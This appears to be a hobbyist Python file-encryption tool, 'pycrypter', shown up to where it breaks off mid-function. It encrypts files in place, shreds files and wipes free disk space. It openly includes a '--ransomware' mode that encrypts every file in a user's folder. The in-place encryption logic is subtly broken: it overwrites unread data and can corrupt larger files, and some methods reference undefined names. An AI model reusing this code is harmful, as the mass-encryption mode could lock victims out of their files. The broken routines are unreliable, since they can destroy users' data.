# pycrypter version
pycrypter_version = "1.2"

# Required Modules
import platform
import atexit
import traceback

import os
import sys
import argparse

import getpass
import signal
import ctypes

import random
import string

# Threading Modules
import threading
import queue

# Other Modules
import time
import psutil
import shutil

# Customization Modules
import colorama
from colorama import Fore, Back, Style
from tqdm import tqdm

colorama.init()

# Tkinter GUI Module
import tkinter as tk

if platform.system() == "Windows":
	# pywin32 Modules
	import win32api
	import win32con
	import win32file
	
	from winnt import MAXDWORD
	import pywintypes

# Cryptography Modules
import base64
import hashlib
import cryptography

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet

# kernel32 signal handler function | cleanup function
def cleanup_handler(signal=0, frame=None, silent=False, exit_reason=""):
	"""
	Create a cleanup handler to handle KeyboardInterrupt or start cleanup
	
	Parameters:
		signal (int): exit signal (optional, defaults to 0)
			The exit code used to exit the script.
		
		frame (frame object): not used (optional, defaults to None)
			Reserved for signal.signal() for Unix systems.
		
		silent (bool): prevent printing exit reason and code (optional, defaults to False)
			Defines whether to print {signal} and {exit_reason}
		
		exit_reason (str): exit reason (optional, defaults to "" [Empty string])
			Defines the exit reason.
			
	Returns:
		int: 0
	"""

	if not silent:
		print(f"\ncleanup_handler raised, signal: {signal} | reason: {exit_reason}")
	return 0

# terminal progress bar
def progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=50, fill='='):
	"""
	Call sys.stdout.write() to write a progress bar to the terminal

	Parameters:
		iteration (int): current iteration (required)
			The current iteration of the loop.
		
		total (int): total iterations (required)
			The total number of iterations for the loop
		
		prefix (str): prefix string (optional, defaults to "")
			A string that appears before the progress bar.
		
		suffix (str): suffix string (optional, defaults to "")
			A string that appears after the progress bar.
		
		decimals (int): positive number of decimals in percent complete (optional, defaults to 1)
			The number of decimal places to show in the percentage.
		
		length (int): character length of bar (optional, defaults to 50)
			The length of the progress bar.
		
		fill (str): bar fill character (optional, defaults to "=")
			The character used to fill the progress bar.

	Returns:
		None
		
	Example usage:
		progress_bar(10, 100, prefix='Progress:', suffix='Complete', decimals=1, length=50, fill='=')
		
		Output:
			Progress: |=====---------------------------------------------| 10.0% Complete
	"""
	
	percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
	filled_length = int(length * iteration // total)
	bar = fill * filled_length + '-' * (length - filled_length)

	sys.stdout.write('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
	sys.stdout.flush()

# |==================================================| Threading functions |==================================================|

class ThreadManager:
	def __init__(self):
		self.threads_set = set()
		self.semaphore = threading.Semaphore(5)
		
	# thread worker
	def worker(self, callback_function, semaphore=None, threads_set=None, *args, **kwargs):

		if not threads_set:
			threads_set = self.threads_set
		
		if not hasattr(semaphore, 'acquire'):
			if semaphore == None:
				semaphore = self.semaphore
			else:
				raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")
		
		if not isinstance(threads_set, (list, set, tuple)):
			raise TypeError(f"threads expected a list/set/tuple, got {type(threads_set)}")
		
		try:
			current_thread = threading.current_thread()

			func_name = callback_function.__name__
			
			with semaphore:  # acquire and release the semaphore
				try:
					callback_function(*args, **kwargs)
				except Exception as err:
					print("\nexception caught while calling: \n")
					traceback.print_exc()
				finally:
					threads_set.remove(current_thread)
		except Exception as err:
			print(f"\nexception caught at worker: \n")
			traceback.print_exc()

	# create a thread
	def thread_create(self, callback, semaphore=None, threads_set=None, thread_name="", *args, **kwargs):

		if not threads_set:
			threads_set = self.threads_set
		
		if not hasattr(semaphore, 'acquire'):
			if semaphore == None:
				semaphore = self.semaphore
			else:
				raise TypeError(f"expected a semaphore/lock, got {type(semaphore)}")
		
		if not isinstance(threads_set, (list, set, tuple)):
			raise TypeError(f"threads expected a list/set/tuple, got {type(threads_set)}")
		
		thread = threading.Thread(
			target = self.worker,
			args = (callback, semaphore, threads_set, *args),
			kwargs = kwargs,
			name = thread_name
		)
		
		threads_set.add(thread)
		thread.start()

		return thread

# |==================================================| Iteration functions |==================================================|

# iterate through a directory and optionally a subdirectory
def iterate_dir(directory, iterate_tree=True, skip_dirs=None):
	"""
	Iterate through a directory while optionally iterating through the sub-directories
	
	Parameters:
		directory (str): directory to iterate (required)
			The directory passed to iterate through.
			
		iterate_tree (bool): iterate through sub-directories (optional, defaults to True)
			Defines whether the script iterates through sub-directories or not.
			
		skip_dirs (list): list of directories to skip (optional, defaults to []/empty list)
			Defines the sub-directories to exclude from the search.
			
		Returns:
			set: file_paths
			- Returns absolute paths
				
		Example usage:
			Passing a non-boolean [True, False] to
			the iterate_tree argument will result in a ValueError:
			
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise ValueError("iterate_tree must be a valid boolean")
			ValueError: iterate_tree must be a valid boolean
			
			[Passing True, False, 1, 0 is a valid boolean]
			
			=========================================================
			Passing a non-existent directory/a file will not raise
			an exception, but instead return a string value, signaling
			an error:
			
			Example 1:
				files = iterate_dir("C:\\MyFakeDirectory", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			Example 2:
				files = iterate_dir("C:\\MyPython\\myfile.txt", iterate_tree=True, skip_dirs=[])
				
				print(files)
				
				[Output]
				NotADirectoryError
			
			=========================================================
			A PermissionError exception will be caught, and added to
			an exception list:
						
			import win32api
			import win32con

			# Set the system attribute for the MyPython folder
			win32api.SetFileAttributes("C:\\MyPython\\", win32con.FILE_ATTRIBUTE_SYSTEM)

			permission_errors = []
			
			# Assume this code has two files, the script and "sys.txt"
			files = iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			print(files)
			print(permission_errors)
			
			[Output]
			[]
			['iterate_dir | A PermissonError occured! Path: "C:\\MyPython"']
			
			---------------------------------------------------------
			How to call:
			
			files = iterate_dir(".", iterate_tree=True, skip_dirs=[])
			
			print(files)
			
			---------------------------------------------------------
			We can assume that the files in the current working directory
			is the current script file and a.txt, so this will be the output:
			
			['.\\pycrypter.py', '.\\a.txt']
			---------------------------------------------------------
			
			If you use "."/".." as the directory argument, any added to
			the list will be formatted as so:
			
			['.\\example.txt', '..\\myfile.txt']
			
			However, using the absolute path like so:
			iterate_dir("C:\\MyPython\\", iterate_tree=True, skip_dirs=[])
			
			Will return the absolute path, formatted like this:
			
			['C:\\MyPython\\a.txt']
	"""
	
	if not skip_dirs:
		skip_dirs = set()
	
	if iterate_tree not in [True, False]:
		raise TypeError(f"iterate_tree expected boolean, got {iterate_tree}")

	file_paths = set()
	
	# Check argument if it's a directory
	if not os.path.isdir(directory):
		if os.path.isfile(directory):
			raise NotADirectoryError(f'[Errno 21] Not a directory: {directory}')
		else:
			raise FileNotFoundError(f'[Errno 2] No such directory: {directory}')
	
	# Iterate through the directory, and catch PermissionErrors
	try:
		directory = os.path.abspath(directory)
		
		for filename in os.listdir(directory):
			path = os.path.join(directory, filename)
			
			if path in skip_dirs:
				continue

			if os.path.isfile(path):
				file_paths.add(path)

			elif os.path.isdir(path) and iterate_tree:
				file_paths.update(iterate_dir(path))
	except PermissionError as err:
		print(f"Caught PermissionError: {err}")

	return file_paths

# |==================================================| Cipher functions |==================================================|

class CipherManager:
	# encryption function
	def encrypt_file(self, input_file, password="", keep_copy=False, hash_pepper=b"", password_pepper=b""):
		"""
		Define a function to encrypt a file in chunks
		using the cryptography.Fernet module.
		
		Parameters:
			input_file (str): the input file (required)
				The file passed to encrypt.
			
			password (str): password to use (optional, defaults to ""/empty string)
				The password used to encrypt the file.
				
			keep_copy (bool): keep a copy of the decrypted file (optional, defaults to False)
				Defines whether the script should keep a copy of the decrypted file.
			
			override_raise (bool): override function raise statements (optional, defaults to False)
				This will override the function's raise statements, disabling them.
		Returns:
			int: 0 [Success]
			
			str:
				[Cleanup] "CleanupInterrupt"
				- This tells the script to stop executing
				
				[Error 1] "input_file == " + sys.argv[0] + " | Illegal operation"
				- This error tells the user that the input file is the current script file.
				
				[Error 2] "File doesn't exist/isn't a file | file_error"
				- This error tells the user that the file passed
				- isn't a file or the file doesn't exist.
				
		Exceptions:
			[Note: override_raise will disable these exceptions]
			
			[Exception 1] raise ValueError("keep_copy must be a valid boolean")
			- This exception tells the user that the keep_copy argument
			- must be a valid boolean. [True, False, 1, 0]
			
			[Exception 2] raise MemoryError(
				f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
			
			- This exception tells the user that the file passed is too large to process.
			- [The file must be below memory_max_allocated, check the variables above]
			
		Example usage:
			Passing the script file will return Error 1
			
			return_value = encrypt_file("pycrypter.py", password="MyPass", keep_copy=False)
			print(return_value)
			
			[Output]
			input_file == pycrypter.py | Illegal operation
			
			=================================================================
			Passing a non-boolean to keep_copy will throw a ValueError [Exception 1]
			
			return_value = encrypt_file("pycrypter.py", password="MyPass", keep_copy="No")
			print(return_value)
			
			[Output]
			Traceback (most recent call last):
			  File "C:\\MyPython\\pycrypter.py", line 1, in <module>
				raise ValueError("keep_copy must be a valid boolean")
			ValueError: keep_copy must be a valid boolean
			
			=================================================================
			Passing a directory/non-existent file will return Error 2
			
			return_value_1 = encrypt_file("not_a_file", password="MyPass", keep_copy=False)
			return_value_2 = encrypt_file("someFakeFile.txt", password="MyPass", keep_copy=False)
			
			print(return_value_1)
			print(return_value_2)
			
			[Output]
			File doesn't exist/isn't a file | file_error
			File doesn't exist/isn't a file | file_error
			
			=================================================================
			Passing a file that exceeds memory_max_allocated will throw a MemoryError [Exception 2]
			
			return_value = encrypt_file("MyLargeFile.txt", password="MyPass", keep_copy=False)
			print(return_value)
			
			[Output]
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
				
			MemoryError: The file "MyLargeFile.txt" exceeds the maximum memory allowed to allocate. (Max: 300.00 MB)
			
			------------------------------------------------------------------
			
			Basic usage:
				# We can assume that text.txt's contents is this:
				# This is my text in this .txt file
				
				return_value = encrypt_file("test.txt", password="MyPass", keep_copy=False)
				print(return_value) # This would print the integer "0"
				
				with open("test.txt", "r") as file:
					print(file.read())
					
				[Output]
				0
				Áî¼Ç6Ò–—0¡sIZéã†¸ëïÖa↕Ò¯;¶ª“QgAAAAABkRw0N50WP2VQ
				-q6i2jeCkVRExdZSvzChp1CFx_wKiPAvv7J6OJr4QFZIguTjp2P_ylVz31Z_kBye_TxjbV_5SAi3b4gSRpJMYkMXqSRFLslJyn1D6s_Hkc8EkgedWHOIqBEXc
				
				# The ciphertext above was separated into two lines to fit it in this docstring
		"""
	
		# Guard clauses
		if input_file == sys.argv[0]:
			raise ValueError(f"illegal operation [input_file == {sys.argv[0]}]")

		if keep_copy not in [True, False]:
			raise TypeError(f'keep_copy expected boolean, got {keep_copy}')

		# Check argument if it's a file
		if not os.path.isfile(input_file):
			if os.path.isdir(input_file):
				raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
			else:
				raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")
		
		# Encrypt the file in chunks
		with open(input_file, "rb+") as file:
			file_size = os.path.getsize(input_file)
			
			if file_size > (2 * 1024 * 1024 * 1024):
				print(f"{Fore.YELLOW}Warning: encrypt_file has detected that {input_file} is larger than 2GB, do not kill the python process.")
			
			salt = os.urandom(32)

			kdf = PBKDF2HMAC(
				algorithm=hashes.SHA256(),
				length=32,
				salt=salt+hash_pepper,
				iterations=100000
			)
			
			key = None
			
			if isinstance(password, bytes):
				key = kdf.derive(password + password_pepper)
			else:
				key = kdf.derive(password.encode() + password_pepper)
			
			fernet_key = base64.urlsafe_b64encode(key)
			
			file.seek(0, os.SEEK_SET)
			chunk = file.read(50 * 1024 * 1024)
			
			file.seek(0, os.SEEK_SET)
			file.write(salt)
			
			if keep_copy:
				file_name, file_ext = os.path.splitext(input_file)
				shutil.copy2(input_file, f"{file_name}_decrypted-copy{file_ext}")

			while chunk:
				chunk_encrypted = Fernet(fernet_key).encrypt(chunk)
				file.write(chunk_encrypted)
				
				chunk = file.read(50 * 1024 * 1024)  # Read 50MB at a time
		return 0

	# decryption function
	def decrypt_file(self, input_file, password="", keep_copy=False, hash_pepper=b"", password_pepper=b""):
		"""
		Define a function to decrypt a file in chunks
		using the cryptography.Fernet module.
		
		Parameters:
			input_file (str): the input file (required)
				The file passed to decrypt.
			
			password (str): password to use (optional, defaults to ""/empty string)
				The password used to decrypt the file.
				
			keep_copy (bool): keep a copy of the decrypted file (optional, defaults to False)
				Defines whether the script should keep a copy of the encrypted file.
				
		Returns:
			int: 0 [Success]
			
			str:
				[Cleanup] "CleanupInterrupt"
				- This tells the script to stop executing
				
				[Error 1] "input_file == " + sys.argv[0] + " | Illegal operation"
				- This error tells the user that the input file is the current script file.
				
				[Error 2] "File doesn't exist/isn't a file | file_error"
				- This error tells the user that the file passed
				- isn't a file or the file doesn't exist.
				
		Exceptions:
			[Exception 1] raise ValueError("keep_copy must be a valid boolean")
			- This exception tells the user that the keep_copy argument
			- must be a valid boolean. [True, False, 1, 0]
			
			[Exception 2] raise MemoryError(
				f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
			
			- This exception tells the user that the file passed is too large to process.
			- [The file must be below 300MB]
			
			[Exception 3] raise DecryptionError(f"The key \"{password}\" is invalid.")
			- This exception indicates that the password passed is invalid.
			- Note: This exception is a custom defined exception
			
		Example usage:
			Passing the script file will return Error 1
			
			return_value = decrypt_file("pycrypter.py", password="MyPass", keep_copy=False)
			print(return_value)
			
			[Output]
			input_file == pycrypter.py | Illegal operation
			
			=================================================================
			Passing a non-boolean to keep_copy will throw a ValueError [Exception 1]
			
			return_value = decrypt_file("pycrypter.py", password="MyPass", keep_copy="No")
			print(return_value)
			
			[Output]
			Traceback (most recent call last):
			  File "C:\\MyPython\\pycrypter.py", line 1, in <module>
				raise ValueError("keep_copy must be a valid boolean")
			ValueError: keep_copy must be a valid boolean
			
			=================================================================
			Passing a directory/non-existent file will return Error 2
			
			return_value_1 = decrypt_file("not_a_file", password="MyPass", keep_copy=False)
			return_value_2 = decrypt_file("someFakeFile.txt", password="MyPass", keep_copy=False)
			
			print(return_value_1)
			print(return_value_2)
			
			[Output]
			File doesn't exist/isn't a file | file_error
			File doesn't exist/isn't a file | file_error
			
			=================================================================
			Passing a file that exceeds memory_max_allocated will throw a MemoryError [Exception 2]
			
			return_value = decrypt_file("MyLargeFile.txt", password="MyPass", keep_copy=False)
			print(return_value)
			
			[Output]
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise MemoryError(f"The file \"{input_file}\" exceeds the maximum memory allowed to allocate. (Max: {max_mem} MB)")
				
			MemoryError: The file "MyLargeFile.txt" exceeds the maximum memory allowed to allocate. (Max: 300.00 MB)
			
			=================================================================
			Passing the wrong password will throw a custom defined DecryptionError [Exception 3]
			
			return_value = decrypt_file("text.txt", password="WrongPassword", keep_copy=False)
			print(return_value)
			
			[Output]
			Traceback (most recent call last):
			  File "C:\MyPython\pycrypter.py", line 1, in <module>
				raise DecryptionError(f"The key \"{password}\" is invalid.")
			
			DecryptionError: The key "WrongPassword" is invalid.
			------------------------------------------------------------------
			
			Basic usage:
				# We can assume that text.txt's contents is this ciphertext:
				# [Had to split it into two lines for this documentation]
				
				# Áî¼Ç6Ò–—0¡sIZéã†¸ëïÖa↕Ò¯;¶ª“QgAAAAABkRw0N50WP2VQ
				# -q6i2jeCkVRExdZSvzChp1CFx_wKiPAvv7J6OJr4QFZIguTjp2P_ylVz31Z_kBye_TxjbV_5SAi3b4gSRpJMYkMXqSRFLslJyn1D6s_Hkc8EkgedWHOIqBEXc
				
				return_value = decrypt_file("test.txt", password="MyPass", keep_copy=False)
				print(return_value) # This would print the integer "0"
				
				with open("test.txt", "r") as file:
					print(file.read())
					
				[Output]
				0
				This is my text in this .txt file
		"""

		# Guard clauses
		if input_file == sys.argv[0]:
			raise ValueError(f"illegal operation [input_file == {sys.argv[0]}]")

		if keep_copy not in [True, False]:
			raise TypeError(f'expected boolean, got {keep_copy}')

		# Check argument if it's a file
		if not os.path.isfile(input_file):
			if os.path.isdir(input_file):
				raise IsADirectoryError(f"[Errno 21] Is a directory: {input_file}")
			else:
				raise FileNotFoundError(f"[Errno 2] No such file: {input_file}")

		# Decrypt the file in chunks
		with open(input_file, "rb+") as file:
			file_size = os.path.getsize(input_file)
			
			if file_size > (2 * 1024 * 1024 * 1024):
				print(f"{Fore.YELLOW}Warning: decrypt_file has detected that {input_file} is larger than 2GB, do not kill the python process.")
			
			salt = file.read(32)
				
			kdf = PBKDF2HMAC(
				algorithm=hashes.SHA256(),
				length=32,
				salt=salt+hash_pepper,
				iterations=100000
			)
			
			if isinstance(password, bytes):
				key = kdf.derive(password + password_pepper)
			else:
				key = kdf.derive(password.encode() + password_pepper)
			
			fernet_key = base64.urlsafe_b64encode(key)
			
			file.seek(32, os.SEEK_SET)
			chunk = file.read(50 * 1024 * 1024)
			
			decrypt_successful = False
			
			try:
				chunk_encrypted = Fernet(fernet_key).decrypt(chunk)
				decrypt_successful = True
			except cryptography.fernet.InvalidToken as error:
				raise error
			finally:
				file.close() if not decrypt_successful else None
			
			# Erase/keep the file
			if keep_copy:
				file_name, file_ext = os.path.splitext(input_file)
				shutil.copy2(input_file, f"{file_name}_decrypted-copy{file_ext}")
			
			cursor_position = None
			plaintext_end = 0
			
			while chunk:
				chunk_decrypted = Fernet(fernet_key).decrypt(chunk)
				plaintext_end += len(chunk_decrypted)
				
				cursor_position = file.tell()
				
				file.seek(0, os.SEEK_SET)
				file.write(chunk_decrypted)
				
				file.seek(cursor_position, os.SEEK_SET)
				chunk = file.read(50 * 1024 * 1024)
			
			file.truncate(plaintext_end)
		return 0
		
	# encryption function
	def encrypt_data(self, data, password="", hash_pepper=b"", password_pepper=b""):
		salt = os.urandom(32)

		kdf = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
			
		key = None
			
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
		
		fernet_key = base64.urlsafe_b64encode(key)
		
		if not isinstance(data, bytes):
			data = data.encode()
		
		encrypted_data = salt + Fernet(fernet_key).encrypt(data) 
		data = None
		
		return encrypted_data

	# decryption function
	def decrypt_data(self, data, password="", hash_pepper=b"", password_pepper=b""):
		salt = data[:32]
				
		kdf = PBKDF2HMAC(
			algorithm=hashes.SHA256(),
			length=32,
			salt=salt+hash_pepper,
			iterations=100000
		)
			
		if isinstance(password, bytes):
			key = kdf.derive(password + password_pepper)
		else:
			key = kdf.derive(password.encode() + password_pepper)
			
		fernet_key = base64.urlsafe_b64encode(key)
		
		decrypted_data = b""
		
		try:
			decrypted_data = Fernet(fernet_key).decrypt(data[32:])
		except cryptography.fernet.InvalidToken as error:
			raise error
		finally:
			data = None
		
		return decrypted_data

# Overwrite deletion
class DataOverwriter:
	def __init__(self):
		self.cleanup = False
	
	def stop(self):
		self.cleanup = True
	
	def file_overwrite(self, file_path, file_size=0, chunk_size=100 * 1024 * 1024):
		try:
			if not isinstance(chunk_size, (int, float)):
				raise TypeError(f"chunk_size expected int/float, got {type(chunk_size).__name__}")
			
			file_path = os.path.abspath(file_path)
			
			if file_size < 1:
				file_size = os.path.getsize(file_path)
			
			memory = psutil.virtual_memory()
			
			memory_available = float(format(memory.available / (1024 * 1024 * 1024)))
			memory_total = float(format(memory.total / (1024 * 1024 * 1024)))
			
			if chunk_size > memory_total:
				raise MemoryError(f"chunk size ({chunk_size:.2f} GB) exceeds total memory available ({memory_total:.2f} GB)")
			elif chunk_size > memory_available:
				raise MemoryError(f"chunk size ({chunk_size:.2f} GB) exceeds available memory ({memory_available:.2f} GB)")
			
			with open(file_path, 'wb') as file:
				original_size = file_size
				
				# Overwrite with a random bytearray
				chunk = chunk_size
				file.truncate(0)		
				
				for pass_iteration in range(16):
					file_size = original_size
					chunk_data = None
					
					if pass_iteration in [0, 1]:
						chunk_data = bytearray([0x00, 0x00]) # First pass
										
					elif pass_iteration in [2, 3]:
						chunk_data = bytearray([0xFF, 0xFF]) # Second pass
										
					elif pass_iteration in [4, 5]:
						chunk_data = bytearray([0x55, 0xAA]) # Third pass
											
					elif pass_iteration in [6, 7]:
						chunk_data = bytearray([0xAA, 0x55]) # Fourth pass
										
					else:
						chunk_data = os.urandom(2) # All other passes
					
					while file_size > 0:
						if self.cleanup:
							file.truncate(0)
							file.close()
							
							os.remove(file_path)
							return
						
						chunk = min(file_size, chunk_size)
						
						file.write(chunk_data * chunk)
						file_size -= chunk
					
					os.fsync(file.fileno())
					file.truncate(0)
		except PermissionError:
			print(f"PermissionError caught, cannot open {file_path}")
		finally:
			os.remove(file_path)

	def freespace_overwrite(self, disk_drive, chunk_size=500 * 1024 * 1024):
		file_name = "disk_filler_file.tmp"
		
		try:
			if not isinstance(chunk_size, (int, float)):
				raise TypeError(f"chunk_size expected int/float, got {type(chunk_size).__name__}")
			
			memory = psutil.virtual_memory()
			
			memory_available = memory.available
			memory_total = memory.total
			
			if chunk_size > memory_total:
				raise MemoryError(f"chunk size ({chunk_size:.2f} GB) exceeds total memory available ({memory_total:.2f} GB)")
			elif chunk_size > memory_available:
				raise MemoryError(f"chunk size ({chunk_size:.2f} GB) exceeds available memory ({memory_available:.2f} GB)")
			
			with open(file_name, 'wb') as file:
				usage = psutil.disk_usage(disk_drive)
				usage_free = usage.free
				
				# Allow 1 GB to be allocated to prevent out of disk issues
				original_free_space = int(format(usage_free // (1024 * 1024 * 1024))) - 1
				chunk_size = 500 * 1024 * 1024
				
				chunk = chunk_size
					
				for pass_iteration in range(3):
					free_space = original_free_space
					chunk_data = None
						
					if pass_iteration == 0:
						chunk_data = bytearray([0x00, 0x00])
							
					elif pass_iteration == 1:
						chunk_data = bytearray([0xFF, 0xFF])
						
					elif pass_iteration == 2:
						chunk_data = os.urandom(2)
						
					while free_space > 0:
						if self.cleanup:
							file.truncate(0)
							file.close()
							
							os.remove(file_name)
							return
						
						file.write(chunk_data * chunk)
						free_space -= chunk
					
					os.fsync(file.fileno())
					file.truncate(0)
		except PermissionError as error:
			raise error
		finally:
			os.remove(file_name) if os.path.isfile(file_name) else None

# Final debugging information, executed after everything
def debug_info(interactive_call=False):
	global bar_iteration
	
	if bar_iteration == 0:
		return "not_in_progress"

	# Worker errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}Worker errors:{Style.RESET_ALL}\n")

	for err in worker_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	# Permission errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}Permission errors:{Style.RESET_ALL}\n")

	for err in permission_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	# File and directory errors
	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")
	print(f"{Fore.LIGHTGREEN_EX}File and directory errors:{Style.RESET_ALL}\n")

	for err in file_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	for err in dir_errors:
		print(f"\n{Fore.LIGHTRED_EX}{err}{Style.RESET_ALL}")
		print(Fore.CYAN + "|-------------------------------------------------------------|" + Style.RESET_ALL)

	print(f"\n{Fore.YELLOW}|-------------------------------------------------------------|{Style.RESET_ALL}")

class Main:
	def __init__(self):
		if __name__ != "__main__":
			raise RuntimeError("class Main must be called as __main__")

		# pepper | DO NOT LEAK THIS!
		self.hash_pepper = b'' # Put your own pepper
		self.password_pepper = b'' # Put your own pepper
		
		self.main_dict = {
			"bar_iteration": 0,
			"bar_total": 0,
			
			"files_count": 0,
			"files_finished": 0,
		}
		
		# cleanup variables
		self.cleanup = False
		self.set_progress_bar = True

		self.interactive = {'init': False}

		# misc
		self.thread_mgr = ThreadManager()
		self.thread_create = ThreadManager().thread_create
		
		self.encrypt_file = CipherManager().encrypt_file
		self.decrypt_file = CipherManager().decrypt_file
		
		# self.parser objects
		self.args = None
		
		self.parser = argparse.ArgumentParser(description=f'Pycrypter CLI by NewGuy103. v{pycrypter_version}')

		self.parser.add_argument(
			'-i', '--interactive',
			action="store_true",
			help="pycrypter's interactive CLI mode"
		)
		
		self.parser.add_argument(
			'-rw', '--ransomware',
			action="store_true",
			help="Ransomware mode, this will fetch the user's folder and cipher files inside it [Excluding AppData]."
		)

		self.parser.add_argument(
			'-e', '--encrypt',
			action="store_true",
			help='Encryption switch.'
		)

		self.parser.add_argument(
			'-d', '--decrypt',
			action="store_true",
			help='Decryption switch.'
		)

		self.parser.add_argument(
			'-ds', "--deep-search",
			action="store_true",
			help='If specified, search the sub-folders of the directory specified.'
		)	

		self.parser.add_argument(
			'-c', "--keep-copy",
			action="store_true",
			help='If specified, keep a copy of the encrypted/decrypted file.'
		)

		self.parser.add_argument(
			'-v', "--verbose",
			action="store_true",
			help='Show detailed output to the command-line.'
		)

		self.parser.add_argument(
			'-t', '--threads',
			metavar='int',
			nargs="?",
			type=int,
			help="Sets the maximum amount of files to process in memory."
		)

		self.parser.add_argument(
			'-f', "--file",
			metavar='input_file',
			type=str,
			nargs="+",
			help='File path(s) to specify.'
		)

		self.parser.add_argument(
			'-dr', "--directory",
			metavar='input_dir',
			type=str,
			nargs="+",
			help='Directory path(s) to specify.'
		)
	
	def pycrypter_interactive():
		"""
		
		"""
		
		self.interactive['init'] = True
		
		def tokenize(string):
			tokens = []
			start = 0
			in_quotes = False

			for iteration, char in enumerate(string):
				if char == '"' or char == "'":
					in_quotes = not in_quotes
				elif char == ' ' and not in_quotes:
					token = string[start:iteration]
					
					if in_quotes and token.startswith('"') and token.endswith('"'):
						token = token[1:-1]  # remove quotes
					tokens.append(token)
					start = iteration + 1

			token = string[start:]
			if in_quotes and token.startswith('"') and token.endswith('"'):
				token = token[1:-1]  # remove quotes
			tokens.append(token)

			for iteration, token in enumerate(tokens):
				if (token[0] == '"' and token[len(token) - 1] == '"'):
					tokens[iteration] = tokens[iteration][1:-1]
				
				if token[0] == "'" and token[len(token) - 1] == "'":
					tokens[iteration] = tokens[iteration][1:-1]
			
			return tokens
		
		while True:
			if self.cleanup:
				break
			
			time.sleep(0.01)
			try:
				command = input("pycrypter> ")
			except EOFError:
				cleanup_handler(signal=0, silent=True, exit_reason="EOFCharacterExit")
				break
			
			if command == "exit":
				cleanup_handler(signal=0, silent=True, exit_reason="SystemExit")
				break
			
			if "encrypt " in command.lower():
				encryption_arguments = command.replace("encrypt ", "").lower()
				keep_copy = False
				
				if "-c " in encryption_arguments or "--keep-copy " in encryption_arguments:
					keep_copy = True
					
					args1 = encryption_arguments.replace("-c ", '')
					encryption_arguments = args1.replace("--keep_copy ", '')
					
				if "-rw" in encryption_arguments or "--ransomware" in encryption_arguments:
					args1 = encryption_arguments.replace("-rw", "")
					encryption_arguments = args1.replace("--ransomware", "")
					
					dir_list = [
						f"C:\\MyPython\\hmm"
					]
					
					skip_dirs = [
						f"C:\\Users\\{current_user}\\AppData"
					]
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					self.ransomware(
						dir_list,
						skip_directories=skip_dirs,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="encrypt"
					)
					
					debug_info()
					continue
					
				if "-f " in encryption_arguments or "--file " in encryption_arguments:
					args1 = encryption_arguments.replace("-f ", "")
					argument_files = args1.replace("--file ", "")
					
					files = tokenize(argument_files)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if files:
						self.cipher_file(
							files,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="encrypt"
						)
					
				if "-dr " in encryption_arguments or "--directory " in encryption_arguments:
					args1 = encryption_arguments.replace("-dr ", "")
					argument_directories = args1.replace("--directory ", "")
					
					directories = tokenize(argument_directories)
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					if directories:
						self.cipher_directory(
							directories,
							verbose=True,
							password=password,
							keep_copy=keep_copy,
							cipher_method="encrypt"
						)
				debug_info()
			
			if "decrypt " in command.lower():
				decryption_arguments = command.replace("decrypt ", "").lower()
				keep_copy = False
				
				if "-c " in decryption_arguments or "--keep-copy " in decryption_arguments:
					keep_copy = True
					
					args1 = decryption_arguments.replace("-c ", '')
					decryption_arguments = args1.replace("--keep_copy ", '')
					
				if "-rw" in decryption_arguments or "--ransomware" in decryption_arguments:
					args1 = decryption_arguments.replace("-rw", "")
					decryption_arguments = args1.replace("--ransomware", "")
					
					dir_list = [
						f"C:\\MyPython\\hmm"
					]
					
					skip_dirs = [
						f"C:\\Users\\{current_user}\\AppData"
					]
					
					password = getpass.getpass("Enter a password: ")
					
					sys.stdout.write("|-------------------------------------------------------------|\n")
					sys.stdout.flush()
					
					self.ransomware(
						dir_list,
						skip_directories=skip_dirs,
						verbose=True,
						password=password,
						keep_copy=keep_copy,
						cipher_method="decrypt"
					)
					
					debug_info()
					continue
					
				if "-f " in decryption_arguments or "--file " in decryption_arguments:
					args1 = decryption_arguments.replace("-f ", "")
					argument_files = args1.replace("--file ", "")
					
